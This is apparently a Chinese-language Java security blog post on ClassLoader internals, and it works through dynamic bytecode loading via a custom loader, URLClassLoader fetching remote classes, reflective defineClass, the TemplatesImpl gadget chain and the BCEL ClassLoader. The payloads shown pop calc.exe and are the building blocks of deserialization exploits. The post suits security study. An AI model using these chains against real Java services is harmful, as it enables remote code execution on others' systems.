---
title: "Java ClassLoader"
date: 2022-11-07T20:59:17+08:00
lastmod: 2022-11-07T20:59:17+08:00
draft: false
author: "X1r0z"

tags: ['classloader']
categories: ['Java 安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

利用 ClassLoader 动态加载 Java 字节码

<!--more-->

Java 是一门编译型语言, 所有 java 源码必须要编译成 class 文件后才能由 JVM 虚拟机加载并执行, 而负责将 class 加载至 JVM 虚拟机这一过程的组件就是 ClassLoader

## ClassLoader 原理

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211061710246.png)

### ClassLoader 基本知识

在 JVM 中存在如下几种 ClassLoader

- BootstrapClassLoader: 由 C++ 实现, 负责加载 `%JAVA_HOME%\lib` 目录中的 java 核心类库, 路径也可由 `-Xbootclasspath` 参数指定

- ExtensionClassLoader: 由 `sun.misc.Launcher$ExtClassLoader` 实现, 负责加载 `%JAVA_HOME\lib\ext` 目录中的 java 扩展库, 路径也可由 `-Djava.ext.dirs` 参数指定

- AppClassLoader: 由 `sun.misc.Launcher$AppClassLoader` 实现, 负责加载当前 classpath 下的 class 文件, 路径也可由 `-Djava.class.path` 参数指定

- UserDefineClassLoader: 为开发者自行编写, 通过继承 `java.lang.ClassLoader` 并重写相关方法来自定义 ClassLoader

>  一般情况下, 如果不指定 ClassLoader, 我们编写的 Java 类在加载时默认会使用 AppClassLoader (可以通过 `ClassLoader.getSystemClassLoader()` 来获取)

其中不同 ClassLoader 会有父子关系 **(非继承关系)**, 其本质是在 `Java.lang.ClassLoader` 内部定义了指向父加载器的的常量 parent, 可以通过调用 getParent() 方法获取父加载器

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211061721821.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211061723937.png)

AppClassLoader 的父加载器为 ExtensionClassLoader, 而 ExtensionClassLoader 的父加载器为 null ?

这是因为其父加载器  BoostrapClassLoader 是由 C++ 实现的, 无法在 Java 中获取对应的引用, 所以显示 null

ClassLoader 之间的**继承关系**如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211061730985.png)

所有的 ClassLoader 都继承自 `java.lang.ClassLoader` 这个抽象类, 而 ExtClassLoader 和 AppClassLoader 继承自 URLClassLoader

URLClassLoader 这个类在后面还会遇到, 之所以这样继承的原因是 URLClassLoader 既可以加载本地的字节码, 也可以加载远程的字节码, 而 ExtClassLoader 和 AppClassLoader 是对加载本地字节码这一功能的更为具体的实现 (个人理解)

因为 `java.lang.ClassLoader` 是所有 ClassLoader 的基石, 所以在这个抽象类中定义了几个比较重要的方法

- loadClass(): 基于双亲委派机制查找 Class, 调用父加载器的 loadClass 方法或自身的 findClass 方法
- findClass(): 根据名称和位置读取字节码, 并调用 defineClass 方法, 具体实现由子类重写
- defineClass(): 把 byte 数组形式的字节码转换成对应的 Class 对象 (真正加载字节码的地方)

### ClassLoader 加载流程 (双亲委派机制)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211071645449.png)

Java 类的加载方式为"动态加载", 即程序不会一开始就将所有的 class 都加载进 JVM, 而是根据程序运行的需要, 一步一步加载所需的 class

class 的加载方法分为两种

- 隐式加载: 通过 new 实例化类, 或通过 `类名.方法名()` 调用其静态方法, 或调用其静态属性
- 显式加载: 通过反射的形式, 例如 `Class.forName()` 或者调用 ClassLoader 的 loadClass 方法

> 其中 `Class.forName()` 有两个重载方法
> ```java
> public static Class<?> forName(String className);
> public static Class<?> forName(String name, boolean initialize, ClassLoader loader);
> ```
> 这里的 initialize 表示是否进行类初始化, 而 loader 用于指定加载该类的 ClassLoader
>
> 调用第一个方法时, initialize 默认为 true, 即进行类初始化 (加载 static 类型的属性, 并且执行 `static {}` 块中的代码), 如果不想初始化类, 可以调用第二个方法并手动指定 initialize 为 false
>
> 而通过 `ClassLoader.loadClass()` 加载的类默认是不会进行类初始化的, 需要注意一下

类加载基于一种叫做"双亲委派"的机制, 那么什么是双亲委派机制?

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211061800485.png)

简单来说, 就是当前 ClassLoader 在加载 class 时, 会将被加载的 class 委托给它的父加载器加载, 以此类推直到最顶层的 BootstrapClassLoader, 如果 BootstrapClassLoader 无法加载这个 class, 则会抛出异常, 然后被子加载器捕获, 并由子加载器继续尝试加载, 如果仍然无法加载, 就一层一层往下直到最开始的 ClassLoader, 如果这个 ClassLoader 也无法加载对应 class, 最终则会抛出 `java.lang.ClassNotFoundException` 异常

看一下 `java.lang.ClassLoader#loadClass` 的源码会更容易理解这个流程

```java
protected Class<?> loadClass(String name, boolean resolve)
    throws ClassNotFoundException
{
    synchronized (getClassLoadingLock(name)) {
        // First, check if the class has already been loaded
        Class<?> c = findLoadedClass(name); // 检查 class 是否已经被加载
        if (c == null) {
            long t0 = System.nanoTime();
            try {
                if (parent != null) {
                    c = parent.loadClass(name, false); // 调用父类的 loadClass 方法, 进行委托
                } else {
                    c = findBootstrapClassOrNull(name); // 此时父加载器为 BootstrapClassLoader
                }
            } catch (ClassNotFoundException e) { // 父加载器无法加载, 捕获异常
                // ClassNotFoundException thrown if class not found
                // from the non-null parent class loader
            }

            if (c == null) {
                // If still not found, then invoke findClass in order
                // to find the class.
                long t1 = System.nanoTime();
                c = findClass(name); // 尝试调用自己的 findClass 方法来加载 class

                // this is the defining class loader; record the stats
                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                sun.misc.PerfCounter.getFindClasses().increment();
            }
        }
        if (resolve) {
            resolveClass(c);
        }
        return c;
    }
}
```

可以看到, 其实 loadClass 的主要作用就是双亲委派, 至于如何获取字节码以及如何将字节码转换为 Class 对象, 都是在 findClass 以及 defineClass 中实现的

另外, JVM 在判断两个 class 是否相同时, 不仅会判断两者的类名是否相同, 而且会判断两个类是否是由同一个 ClassLoader 加载的, 只有这两个条件同时满足, 才能说明这两个 class 相同

### 自定义 ClassLoader

有了上面的知识, 我们就可以自己编写一个 ClassLoader

ClassLoader 能够加载字节码的关键就在于 loadClass findClass defineClass 这三个方法, 因为 loadClass 实现了双亲委派机制, Java 官方不推荐直接重写该方法 (除去一些特殊情况, 比如 tomcat 和 jdbc 就破坏了这种机制), 而 defineClass 是一个 native 方法, 底层由 C++ 实现, 所以我们的重点就是重写 findClass 方法, 并最终在里面调用 defineClass

> 一个 ClassLoader 在实例化时如果没有指定 parent, 那么它的默认 parent 为 AppClassLoader, 可以通过重写对应的带参构造方法来手动指定 parent ClassLoader

下面实现了非 classpath 下加载 class 的 FileClassLoader

Hello.java

```java
public class Hello {
    public Hello(){
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

FileClassLoader.java

```java
package com.example;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class FileClassLoader extends ClassLoader{
    protected String basePath;

    public FileClassLoader(String basePath){
        super();
        this.basePath = basePath;
    }
    @Override
    protected Class<?> findClass(String name){
        byte[] arr;
        try {
            Path path = Paths.get(this.basePath, name + ".class");
           arr = Files.readAllBytes(path);
            return defineClass(name, arr, 0, arr.length);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    public static void main(String[] args) throws Exception{
        ClassLoader classLoader = new FileClassLoader("D:\\");
        Class clazz = classLoader.loadClass("Hello");
        clazz.newInstance();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211071713584.png)

## 利用 ClassLoader 动态加载字节码

### URLClassLoader

这里主要讨论用 URLClassLoader 加载远程 class 的情况

Hello.java

```java
public class Hello {
    public Hello(){
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

执行 `javac Hello.java`, 然后将编译后的 class 文件放在网站根目录下 (如果存在包名则需要按照包名层级建立对应目录)

payload 如下

```java
package com.example;


import java.net.URL;
import java.net.URLClassLoader;

public class Demo {
    public static void main(String[] args) throws Exception{
        URL url = new URL("http://127.0.0.1:8000/");
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class clazz = loader.loadClass("Hello");
        clazz.newInstance();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211071833159.png)

URLClassLoader 也能够加载 jar 包里的 class, 只需要将打包后的 jar 放在网站根目录下, 然后指定 url 为 `http://127.0.0.1:8000/test.jar` 即可

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211071835619.png)

### ClassLoader#defineClass

上面讲过, defineClass 的作用就是将字节数组转为对应的 Class 对象, 该方法的签名如下

```java
protected final Class<?> defineClass(String name, byte[] b, int off, int len);
```

name 为类名 (可设置为 null), b 为字节码数组, off 为数组的偏移值 (从第几位开始为字节码数据), len 为数组的长度

因为 defineClass 是一个 protected 方法, 所以我们只能通过反射来调用

首先需要获取 ClassLoader, 以下是常用几种获取 ClassLoader 的方式

```java
ClassLoader loader = Thread.currentThread().getContextClassLoader();
ClassLoader loader = ClassLoader.getSystemClassLoader();
ClassLoader loader = this.getClass().getClassLoader();
```

payload 如下

```java
package com.example;

import java.lang.reflect.*;
import java.util.Base64;

public class Demo {
    public static void main(String[] args) throws Exception{
        String exp = "yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKBwAbDAAcAB0BAAhjYWxjLmV4ZQwAHgAfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAQABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAACAAQABAANAAcAEAAFABEABgAVAAgADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAAAAAIAEQ==";
        byte[] code = Base64.getDecoder().decode(exp);
        ClassLoader loader = ClassLoader.getSystemClassLoader(); // AppClassLoader
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        Class clazz = (Class) defineClassMethod.invoke(loader, "Hello", code, 0, code.length);
        clazz.newInstance();
    }
}
```

注意 getDeclaredMethod 只能获取当前类的所有方法, 而 defineClass 其实是在 AppClassLoader 的父类 `java.lang.ClassLoader` 里面, 所以需要通过 `ClassLoader.class` 来获取 Class 对象

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211071853243.png)

### TemplatesImpl

因为 defineClass 的作用域往往都是不开放的, 攻击者一般很难利用到它, 所以接下来我们引入 TemplatesImpl 这条非常重要的利用链, 它是各大反序列化链 (cc, rome, fastjson) 利用的基础

TemplatesImpl 的全类名是 ` com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`, 其内部实现了一个 TransletClassLoader

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211071955216.png)

可以看到 TransletClassLoader 的 defineClass 方法没有访问修饰符, 这样的话它的作用域就为包作用域, 即可以在同一个包内被调用

据此在 TemplatesImpl 内部寻找调用 defineClass 的方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072000492.png)

其中一些以下划线开头的属性的定义如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072002781.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072008723.png)

defineTransletClasses 先判断 `_bytecodes` 是否为 null, 然后实例化了 TransletClassLoader

之后获取 `_bytecodes.length` 作为 classCount (`_bytecodes` 是一个二维数组, 它的长度表示一共有几组字节码需要被加载)

接着遍历 `_bytecodes` 并且调用 `loader.defineClass()` 将返回值赋给 `_class` 数组

最后会判断该 Class 是否继承自 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`, 如果条件为真, 就将 `_transletIndex` 赋为 Class 对应的索引

这里的 defineTransletClasses 还是一个 private 方法, 我们继续寻找调用它的其它方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072011740.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072011427.png)

由于经过了 defineClass 生成的 Class 对象不会被初始化, 所以我们需要手动调用它的静态方法/字段, 或者其构造函数来让它初始化/实例化

getTransletClasses 和 getTransletIndex 虽然都调用了 defineTransletClasses , 但是它们在调用之后并没有进行任何操作, 那么最终被加载的类就无法初始化/实例化, 不符合要求

而 getTransletInstance 在调用了 defineTransletClasses 之后, 先判断 `_name` 是否为 null, 然后通过 `_transletIndex` 取得 `_class` 数组中对应的 Class 对象并调用了其**无参构造方法**来实例化, 刚好符合了我们的要求

之后继续寻找调用了 getTransletInstance 的方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072017488.png)

newTransformer 方法的访问修饰符为 public, 意味着可以从外部调用, 方法内部在实例化 TransformerImpl 的时候调用了 getTransletInstance

利用链到这里就能触发了, 当然也可以继续向上找

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072019735.png)

getOutputProperties 的访问修饰符也是 public, 并且调用了 newTransformer 方法, 刚好也符合要求

最终我们的利用链为

```
TemplatesImpl#getOutputProperties()
TemplatesImpl#newTransformer()
TemplatesImpl#getTransletInstance()
TemplatesImpl#defineTransletClasses()
TransletClassLoader#defineClass()
```

先编写被加载的类, 注意需要继承自 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Hello extends AbstractTranslet {
    public Hello(){
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

编写 payload

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.*;
import java.util.Base64;
import java.util.Properties;

public class Demo {
    public static void main(String[] args) throws Exception{
        String exp = "yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAmAAoBABFjb20vZXhhbXBsZS9IZWxsbwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAADAAEACQAKAAEACwAAAGAAAgACAAAAFiq3AAG4AAISA7YABFenAAhMK7YABrEAAQAEAA0AEAAFAAIADAAAABoABgAAAAoABAAMAA0ADwAQAA0AEQAOABUAEAANAAAAEAAC/wAQAAEHAA4AAQcADwQAAQAQABEAAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABUAEgAAAAQAAQATAAEAEAAUAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaABIAAAAEAAEAEwABABUAAAACABY=";
        byte[] code = Base64.getDecoder().decode(exp);
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue("_name", "Hello", templatesImpl);
        setFieldValue("_bytecodes", new byte[][]{code}, templatesImpl);
        setFieldValue("_outputProperties", new Properties(), templatesImpl);
        setFieldValue("_indentNumber", 0, templatesImpl);
        setFieldValue("_tfactory", new TransformerFactoryImpl(), templatesImpl);
        templatesImpl.getOutputProperties();
    }
    public static void setFieldValue(String name, Object value, Object obj) throws Exception{
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}
```

因为 TemplatesImpl 只有一个无参构造方法为 public, 所以相关属性的设置只能通过反射来实现

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072037874.png)

测试的时候发现 `_outputProperties` 和 `_indentNumber` 不用设置也能弹出计算器

### BCEL ClassLoader

关于 BCEL 的介绍这里就不写了, 我们主要利用的是 BCEL 中的 `com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`, 该方法接收一个 String, 并判断是否以 `$$BCEL$$` 开头, 然后将其后面的字符串解析成 Java 字节码, 最终加载 class

在 BCEL 中有两个工具类 Repository 和 Utility, Repository 用于将 Class 对象转换成原生字节码 (与 javac 编译的 class 内容一致), 而 Utility 用于将原生字节码转换成 BCEL 格式的字节码 (转换过程中还会存在 gzip 压缩)

> 需要注意的是在 Java 8u251 中, Oracle 移除了 `com.sun.org.apache.bcel.internal.util.ClassLoader`, 并且用 Repository 和 Utility 在开启 gzip 压缩的情况下生成的 BCEL 字节码也会出现问题, 建议使用 8u251 以下的 Java 8, 或者使用 Java 7 等更低版本

这里我用的是 Java 8u40

先编写被加载的类

```java
package org.example;

public class Hello {
    public Hello(){
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

生成对应的 BCEL 格式的字节码

```java
package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

public class Demo {
    public static void main(String[] args) throws Exception{
        JavaClass cls = Repository.lookupClass(Hello.class);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072110188.png)

最后通过 `com.sun.org.apache.bcel.internal.util.ClassLoader` 加载 class

```java
package org.example;

import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class Demo {
    public static void main(String[] args) throws Exception{
        String exp = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$h1$Q$7dN$96l$d8n$c8$HM$da$Cm$f9nh$a5$e4$c2$N$d4K$d5$8a$c3$f2$n$82$e8$d91Vp$d8$ecF$h$a7$ca$a1$ff$a7$e7$5eh$c5$81$l$d0$lUx$8e$Q$m$81$z$8f$f5f$de$bc$99$b1$ff$fd$bf$ba$G$b0$8d$cd$AE$bc$K$f0$go$8aXp$f7$a2$8f$a5$A3x$eb$e3$9d$8f$f7$C$85$5d$93$Y$fbY$m$df$dc$3a$V$f0$be$a4gZ$a0$i$99D$l$8c$H$5d$9d$9d$c8nLO$zJ$95$8cOef$i$bes$K$9ez$d4$97$3fd$3b$96I$af$fdu$a2$f4$d0$9a4$d9$a1$92$3d7$p$81$f9$u$cdzm$3d$91$83a$ac$db$7b$3a$8eS$GK$j$x$d5$c5$be$iN$85$a6$bd$y$J$E$9dt$9c$v$fd$cd8$ed$60$cam9$f1$Q$b3$I$7c$y$87X$c1$aa$40$91$8d$a8$96$9e$e8$QkXg$89g$g$I$b1$81$40$a0$fa$a4$b8$40$e5$81$7e$d8$edkeI$7bp$j$8f$Tk$G$ae$7eO$db$7bPonEO8nHv$a1$E$3e4$lE$3b63Io$e7q$c2Q$96$w$3d$g1$a1$3cd$d0N$a7$3f$c9$a4$d2$9c$c8$e7$l$b9$c5$e7ts$d2$be$m$fa$89$i7$d0$f8$f8$H$e2$_r$b5$fc$r$bc$ef$bfP$8c$3e$5d$a2$f0$9b$y$P$rT$f8$95y$84$e4$z$a0$40$ebq$X$e8$9fe$c4G$95$cau$w$96$9c$O$d5$aa$8c$ce$a1$cc$5c$87$x$c4$40$8d$a7$82$dc$N$8d$f01$ef$ccK$8f$8c$3a$fd94n$B$91$fc$hTK$C$A$A";
        ClassLoader loader = new ClassLoader();
        Class clazz = loader.loadClass(exp);
        clazz.newInstance();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211072112750.png)

## 参考文章

[https://segmentfault.com/a/1190000013469223](https://segmentfault.com/a/1190000013469223)

[https://segmentfault.com/a/1190000008491597](https://segmentfault.com/a/1190000008491597)

[https://www.anquanke.com/post/id/260902](https://www.anquanke.com/post/id/260902)

[https://xz.aliyun.com/t/9002](https://xz.aliyun.com/t/9002)

[https://zhuanlan.zhihu.com/p/51374915](https://zhuanlan.zhihu.com/p/51374915)

[https://www.cnblogs.com/hollischuang/p/14260801.html](https://www.cnblogs.com/hollischuang/p/14260801.html)

[https://javasec.org/javase/ClassLoader](https://javasec.org/javase/ClassLoader)

[https://blog.csdn.net/w1196726224/article/details/56529615](https://blog.csdn.net/w1196726224/article/details/56529615)

[https://www.cnblogs.com/jxzheng/p/5191037.html](https://www.cnblogs.com/jxzheng/p/5191037.html)

[https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)
